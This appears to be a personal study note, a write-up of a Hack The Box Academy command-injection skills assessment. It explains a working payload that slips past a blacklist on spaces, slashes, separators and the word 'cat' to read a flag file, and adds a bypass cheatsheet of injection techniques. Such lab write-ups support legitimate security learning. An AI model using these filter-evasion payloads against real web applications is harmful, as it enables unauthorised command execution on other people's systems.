---
tags: [htb, command-injection, filter-bypass, rce, bash, web]
assessment: HTB Command Injections — Skills Assessment
type: academy
created: 2026-11-05
---

# Command Injection (Filter Bypass → Flag)

> [!summary] Core idea
> The injection point was easy to find — the hard part was a blacklist that stripped out **spaces, slashes, and obvious command keywords**. The whole payload is really one lesson repeated: for every character the filter blocks, the shell gives you another way to produce it. **Don't fight the filter head-on; route around it using the shell's own syntax.**

---

## The situation

A web-based **file manager** (note the `filemanager` cookie) with a "move file" action. The relevant request:

```http
GET /index.php?to=tmp&from=605311066.txt&finish=1&move=1 HTTP/1.1
```

The backend takes `to` and `from` and runs a shell command to move the file (something like `mv <from> <to>/`). The `to` parameter is concatenated straight into that command — **classic OS command injection**. `finish=1&move=1` are the flags that actually trigger the move (and therefore the vulnerable code path), so they have to be present for the injection to fire.

The catch: a blacklist filters the usual injection characters, so a naive `to=tmp;cat /flag.txt` gets rejected.

---

## The final payload

```
GET /index.php?to=tmp%26c'a't%09${PATH:0:1}flag.txt&from=605311066.txt&finish=1&move=1
```

The `to` value, URL-decoded:

```
tmp & c'a't <TAB> ${PATH:0:1}flag.txt
```

…which the shell ultimately executes as:

```
tmp & cat /flag.txt
```

Every piece is a bypass. Here's what each one is doing and the filter it defeats.

---

## Anatomy of the bypass

| Payload fragment | Decodes / resolves to | Filter it beats | How it works |
|---|---|---|---|
| `%26` | `&` | separator chars (`;` `\|` `&&`) blocked | `%26` hides the `&` from the URL parser so it reaches the shell as a literal command separator — the injected command runs after `tmp` |
| `c'a't` | `cat` | the keyword `cat` blacklisted | the shell performs **quote removal** during parsing, so `c'a't` collapses to `cat`; a string-match blacklist never sees the word |
| `%09` | tab | **space** blacklisted | a tab is valid whitespace to the shell, so it works as the argument separator in place of a space |
| `${PATH:0:1}` | `/` | **slash** blacklisted | bash **substring expansion**: `$PATH` starts with `/usr/...`, so characters `0..1` give you a single `/` — a slash produced without typing one |
| `flag.txt` | `flag.txt` | — | the target file, now reachable as `/flag.txt` |

> [!tip] The three building blocks
> - **No separators?** → `%26` (`&`), or `%0a` (newline), or a backtick / `$()` subshell.
> - **No spaces?** → tab (`%09`), `${IFS}`, `$IFS$9`, or brace syntax `{cat,/flag.txt}`.
> - **No slashes / blocked keyword?** → build the character from an env var substring (`${PATH:0:1}` → `/`), and split keywords with quotes (`c'a't`), backslashes (`ca\t`), or concatenation.

---

## Reconstructing it from scratch

If you only have the final payload, here's the order you'd actually *discover* each layer — useful for understanding why the payload looks the way it does:

1. **Confirm injection.** Append a separator and a trivial command to `to`. If `;`, `|`, `&&` are all rejected, try `%26` (`&`) and `%0a` (newline). One gets through → injection confirmed.
2. **Hit the space wall.** `cat /flag.txt` fails because of the space. Swap in a tab (`%09`) or `${IFS}`.
3. **Hit the keyword wall.** `cat` is blocked. Break the word with quotes → `c'a't`. (The shell collapses it back to `cat`.)
4. **Hit the slash wall.** `/flag.txt` is blocked because of `/`. Generate the slash from an environment variable: `${PATH:0:1}`.
5. **Assemble.** `tmp` + `&` + `c'a't` + tab + `${PATH:0:1}flag.txt`, URL-encoding the `&` and the tab so they survive transit.

> [!note] Why this reads as skill
> Each wall was solved with a *different* shell feature — quote removal, whitespace equivalence, parameter expansion. That's the signal that you understand how the shell parses a command, not just a list of payloads you pasted.

---

## Result

The response returns the contents of `/flag.txt`. Command execution confirmed, flag captured — no space, slash, or `cat` keyword ever sent literally.

---

## Reusable takeaways

- [ ] **Find the injection with separators, then solve the filter one character at a time** — each rejection tells you exactly what's blocked.
- [ ] **Quote removal splits keywords** — `c'a't`, `ca""t`, `ca\t` all run as `cat` but dodge string blacklists.
- [ ] **Whitespace has substitutes** — tab (`%09`), `${IFS}`, `$IFS$9`, `{a,b}` brace syntax.
- [ ] **Env-var substring expansion mints blocked characters** — `${PATH:0:1}` → `/`, `${HOME:0:1}` → `/`; no literal slash needed.
- [ ] **URL-encode shell metacharacters** so they reach the shell instead of being eaten by the HTTP/query parser (`&` → `%26`, tab → `%09`, newline → `%0a`).

## Payload quick-reference

```
# Final (to= value, URL-encoded)
to=tmp%26c'a't%09${PATH:0:1}flag.txt&from=605311066.txt&finish=1&move=1

# Decoded intent
tmp & cat /flag.txt

# Bypass cheatsheet
&      -> %26            (separator; also %0a newline)
space  -> %09 / ${IFS}   (whitespace)
cat    -> c'a't / ca\t   (keyword split via quote removal)
/      -> ${PATH:0:1}    (slash from env-var substring)
```
